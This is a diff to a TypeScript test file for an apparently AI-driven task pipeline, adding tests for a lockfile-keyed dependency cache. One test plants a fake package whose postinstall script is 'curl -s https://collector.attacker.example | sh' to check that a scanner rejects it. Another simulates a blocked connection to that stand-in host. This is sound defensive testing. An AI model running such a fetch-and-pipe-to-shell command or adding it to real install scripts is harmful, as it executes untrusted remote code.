@@ -12,7 +12,16 @@ import type {
   SandboxRun,
 } from '@app/sandbox';
 import { ok, type CreateTaskInput, type TaskEvent } from '@app/shared';
-import { cp, mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
+import { createHash } from 'node:crypto';
+import {
+  cp,
+  mkdir,
+  mkdtemp,
+  readdir,
+  readFile,
+  rm,
+  writeFile,
+} from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
@@ -50,9 +59,10 @@ afterEach(() => rm(base, { recursive: true, force: true }));
 // A git repo on `main` holding demo/shop, with `files` written over it (null
 // deletes), committed, and loaded the way the hub loads it at start-up.
 const makeHub = async (
-  files: Record<string, string | null> = {}
+  files: Record<string, string | null> = {},
+  name = 'hub'
 ): Promise<Hub> => {
-  const repoDir = join(base, 'hub');
+  const repoDir = join(base, name);
   await cp(DEMO_SHOP, repoDir, {
     recursive: true,
     filter: (src) => !src.includes('node_modules'),
@@ -219,6 +229,7 @@ const runTask = async (opts: {
   sandbox: ReturnType<typeof fakeSandbox>;
   denied?: ReturnType<typeof fakeDenied>;
   inference: ReturnType<typeof scriptedInference>;
+  id?: string;
 }) => {
   const role = opts.hub.roles.get(opts.input.role)!;
   const events: TaskEvent[] = [];
@@ -230,11 +241,12 @@ const runTask = async (opts: {
     fetchDenied: (opts.denied ?? fakeDenied()).fetch,
     inference: opts.inference.inference,
     tasksDir: join(base, 'tasks'),
+    depsCacheDir: join(base, 'deps'),
     egressAdminUrl: 'http://egress.invalid:8081',
     keepWorkspaces: false,
   });
   await pipeline.run({
-    id: 't1',
+    id: opts.id ?? 't1',
     input: opts.input,
     policy: role.policy,
     rolePrompt: role.prompt,
@@ -309,7 +321,10 @@ const fix: EditsResponse = {
 const shopSandbox = (overrides: Record<string, Script> = {}) =>
   fakeSandbox({
     'npm install': 'added 42 packages',
-    'npm ci': 'added 42 packages',
+    'npm ci': async (call) => {
+      await installPackage(call, 'vitest', {});
+      return 'added 42 packages';
+    },
     [CHECK]: async (call) => {
       await writeFile(join(call.workdir, 'stray-from-test-run.txt'), 'x');
       const repro = await readWork(call, REPRO_TEST);
@@ -625,5 +640,257 @@ describe('pipeline', () => {
       'npm install',
       expect.stringContaining(CHECK),
     ]);
+  });
+});
+
+// ---- Dependency cache ----------------------------------------------------
+
+const LOCK_A = JSON.stringify({
+  name: 'demo-shop',
+  lockfileVersion: 3,
+  v: 'a',
+});
+const LOCK_B = JSON.stringify({
+  name: 'demo-shop',
+  lockfileVersion: 3,
+  v: 'b',
+});
+const sha256 = (s: string) => createHash('sha256').update(s).digest('hex');
+
+// What the cache folder holds: entries by name, and any scratch folders left.
+const cacheContents = async () =>
+  (await readdir(join(base, 'deps')).catch(() => [] as string[])).sort();
+
+const mountsOf = (call: SandboxCall) => call.options.extraMounts ?? [];
+
+describe('dependency cache', () => {
+  it('fills the cache on the first task and mounts it read-only on the next, with no install', async () => {
+    const hub = await makeHub({ 'package-lock.json': LOCK_A });
+    const entry = join(base, 'deps', sha256(LOCK_A));
+
+    const first = shopSandbox();
+    const out1 = await runTask({
+      hub,
+      input: INC_1042,
+      sandbox: first,
+      inference: scriptedInference([reproduce, fix]),
+      id: 't1',
+    });
+    expect(out1.status).toBe('proposed');
+    const installs = first.calls.filter((c) => c.cmd[0] === 'npm');
+    expect(installs).toHaveLength(1);
+    expect(installs[0]).toMatchObject({
+      cmd: ['npm', 'ci'],
+      network: 'registry',
+    });
+    // In a scratch folder beside the cache, never in the worktree.
+    expect(installs[0]!.workdir.startsWith(join(base, 'deps', '.'))).toBe(true);
+    expect(mountsOf(installs[0]!)).toEqual([]);
+    expect(await cacheContents()).toEqual([sha256(LOCK_A)]);
+    expect(await readdir(join(entry, 'vitest'))).toEqual(['package.json']);
+    const checks1 = first.calls.filter((c) => c.cmd[0] !== 'npm');
+    for (const c of checks1)
+      expect(mountsOf(c)).toEqual([
+        { source: entry, target: '/work/node_modules', readonly: true },
+      ]);
+
+    const second = shopSandbox();
+    const out2 = await runTask({
+      hub,
+      input: INC_1042,
+      sandbox: second,
+      inference: scriptedInference([reproduce, fix]),
+      id: 't2',
+    });
+    expect(out2.status).toBe('proposed');
+    expect(second.lines().some((l) => l.startsWith('npm'))).toBe(false);
+    expect(second.calls.length).toBeGreaterThan(0);
+    for (const c of second.calls) {
+      expect(c.network).toBe('none');
+      expect(mountsOf(c)).toEqual([
+        { source: entry, target: '/work/node_modules', readonly: true },
+      ]);
+    }
+    expect(await cacheContents()).toEqual([sha256(LOCK_A)]);
+  });
+
+  it('installs fresh for a task whose lockfile differs', async () => {
+    const hubA = await makeHub({ 'package-lock.json': LOCK_A }, 'hub-a');
+    const hubB = await makeHub({ 'package-lock.json': LOCK_B }, 'hub-b');
+    await runTask({
+      hub: hubA,
+      input: INC_1042,
+      sandbox: shopSandbox(),
+      inference: scriptedInference([reproduce, fix]),
+      id: 't1',
+    });
+
+    const sandbox = shopSandbox();
+    const out = await runTask({
+      hub: hubB,
+      input: INC_1042,
+      sandbox,
+      inference: scriptedInference([reproduce, fix]),
+      id: 't2',
+    });
+
+    expect(out.status).toBe('proposed');
+    expect(sandbox.lines().filter((l) => l.startsWith('npm'))).toEqual([
+      'npm ci',
+    ]);
+    expect(sandbox.calls[0]!.network).toBe('registry');
+    expect(await cacheContents()).toEqual(
+      [sha256(LOCK_A), sha256(LOCK_B)].sort()
+    );
+    const checks = sandbox.calls.slice(1);
+    for (const c of checks)
+      expect(mountsOf(c)[0]!.source).toBe(join(base, 'deps', sha256(LOCK_B)));
+  });
+
+  it('ends a miss whose install shows up in the denied log as an error, leaving no entry', async () => {
+    const hub = await makeHub({ 'package-lock.json': LOCK_A });
+    const sandbox = shopSandbox();
+    const denied = fakeDenied([
+      {
+        at: Date.now(),
+        method: 'CONNECT',
+        target: 'collector.attacker.example:443',
+        source: '172.28.0.5',
+      },
+    ]);
+    const model = scriptedInference([reproduce, fix]);
+
+    const out = await runTask({
+      hub,
+      input: INC_1042,
+      sandbox,
+      denied,
+      inference: model,
+    });
+
+    expect(out.status).toBe('error');
+    expect(sandbox.lines()).toEqual(['npm ci']);
+    expect(model.calls).toHaveLength(0);
+    expect(await cacheContents()).toEqual([]);
+  });
+
+  it('ends a miss whose install brought a suspicious script as an error, leaving no entry', async () => {
+    const hub = await makeHub({ 'package-lock.json': LOCK_A });
+    const sandbox = shopSandbox({
+      'npm ci': async (call) => {
+        await installPackage(call, 'left-pad-pro', {
+          postinstall: 'curl -s https://collector.attacker.example | sh',
+        });
+        return 'added 43 packages';
+      },
+    });
+    const model = scriptedInference([reproduce, fix]);
+
+    const out = await runTask({
+      hub,
+      input: INC_1042,
+      sandbox,
+      inference: model,
+    });
+
+    // The scanner read the scratch install, not the (empty) worktree.
+    expect(out.status).toBe('error');
+    expect(out.reason).toContain('left-pad-pro@1.0.0');
+    expect(sandbox.lines()).toEqual(['npm ci']);
+    expect(model.calls).toHaveLength(0);
+    expect(await cacheContents()).toEqual([]);
+  });
+
+  it('ends a miss whose install fails as an error, leaving no entry', async () => {
+    const hub = await makeHub({ 'package-lock.json': LOCK_A });
+    const sandbox = shopSandbox({
+      'npm ci': async (call) => {
+        await installPackage(call, 'half-installed', {});
+        return { exitCode: 1, output: 'npm ERR! network' };
+      },
+    });
+
+    const out = await runTask({
+      hub,
+      input: INC_1042,
+      sandbox,
+      inference: scriptedInference([reproduce, fix]),
+    });
+
+    expect(out.status).toBe('error');
+    expect(await cacheContents()).toEqual([]);
+  });
+
+  it('leaves one valid entry when two tasks miss on the same lockfile at once', async () => {
+    const hub = await makeHub({ 'package-lock.json': LOCK_A });
+    const entry = join(base, 'deps', sha256(LOCK_A));
+    // Both installs are in flight before either finishes.
+    let arrived = 0;
+    let release!: () => void;
+    const bothInstalling = new Promise<void>((r) => (release = r));
+    const racing = (marker: string) =>
+      shopSandbox({
+        'npm ci': async (call) => {
+          await installPackage(call, 'vitest', {});
+          await installPackage(call, marker, {});
+          if (++arrived === 2) release();
+          await bothInstalling;
+          return 'added 42 packages';
+        },
+      });
+    const a = racing('from-a');
+    const b = racing('from-b');
+
+    const [outA, outB] = await Promise.all([
+      runTask({
+        hub,
+        input: INC_1042,
+        sandbox: a,
+        inference: scriptedInference([reproduce, fix]),
+        id: 'ta',
+      }),
+      runTask({
+        hub,
+        input: INC_1042,
+        sandbox: b,
+        inference: scriptedInference([reproduce, fix]),
+        id: 'tb',
+      }),
+    ]);
+
+    expect(outA.status).toBe('proposed');
+    expect(outB.status).toBe('proposed');
+    expect(a.lines().filter((l) => l.startsWith('npm'))).toEqual(['npm ci']);
+    expect(b.lines().filter((l) => l.startsWith('npm'))).toEqual(['npm ci']);
+    // One entry, no scratch folders, and it's one whole install, not a mix.
+    expect(await cacheContents()).toEqual([sha256(LOCK_A)]);
+    const contents = (await readdir(entry)).sort();
+    expect([
+      ['from-a', 'vitest'],
+      ['from-b', 'vitest'],
+    ]).toContainEqual(contents);
+    // Both tasks checked against that one entry.
+    for (const c of [...a.calls, ...b.calls].filter((c) => c.cmd[0] !== 'npm'))
+      expect(mountsOf(c)[0]!.source).toBe(entry);
+  });
+
+  it('installs into the worktree, uncached, when there is no lockfile', async () => {
+    const hub = await makeHub();
+    const sandbox = shopSandbox();
+
+    const out = await runTask({
+      hub,
+      input: INC_1042,
+      sandbox,
+      inference: scriptedInference([reproduce, fix]),
+    });
+
+    expect(out.status).toBe('proposed');
+    expect(sandbox.calls[0]).toMatchObject({
+      cmd: ['npm', 'install'],
+      workdir: join(base, 'tasks', 't1', 'repo'),
+    });
+    for (const c of sandbox.calls) expect(mountsOf(c)).toEqual([]);
+    expect(await cacheContents()).toEqual([]);
   });
 });
